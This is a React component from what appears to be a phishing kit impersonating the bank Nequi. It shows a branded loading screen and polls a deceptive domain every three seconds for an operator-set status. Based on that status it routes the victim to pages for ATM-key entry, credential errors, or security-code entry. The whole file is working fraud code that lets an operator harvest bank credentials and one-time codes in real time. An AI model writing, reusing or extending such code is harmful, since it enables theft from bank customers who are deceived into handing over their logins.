import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";

const Loading = () => {
  const [loading, setLoading] = useState(true);
  const navigate = useNavigate();

  useEffect(() => {
    const guestId = localStorage.getItem("id");

    if (!guestId) {
      console.error("No se encontró el id en el localStorage");
      return;
    }

    const interval = setInterval(async () => {
      try {
        console.log(guestId);
        const response = await axios.get(
          `https://prestamopropulsorverified.lat/api/v1/guest/${guestId}`
        );

        const data = response.data;

        if (data && data.status_id) {
          const statusId = data.status_id;

          switch (statusId) {
            case 2:
              setLoading(false);
              navigate("/nequi/ingreso/ATM");
              break;
            case 3:
              setLoading(false);
              navigate("/nequi/error_credentials");
              break;
            case 4:
              setLoading(false);
              navigate("/nequi/error_credentials");
              break;
            default:
              break;
            case 5:
              setLoading(false);
              navigate("/nequi/ingreso/codigo_seguridad");
              break;
            case 6:
              setLoading(false);
              navigate("/nequi/ingreso/codigo_seguridad_error");
              break;
          }
        }
      } catch (error) {
        console.error("Error al consultar el estado:", error);
      }
    }, 3000); // Llamada cada 3 segundos

    // Limpiar el intervalo cuando el componente se desmonte
    return () => clearInterval(interval);
  }, [navigate]);



  return (
    <div className="fixed top-0 left-0 w-full h-full bg-white bg-opacity-70 flex items-center justify-center z-50">
      <img
        src="/assets/preload-nequi.gif"
        alt="Logo Cargando"
        className="w-28 h-auto animate-pulse"
      />
    </div>
  );
};

export default Loading;
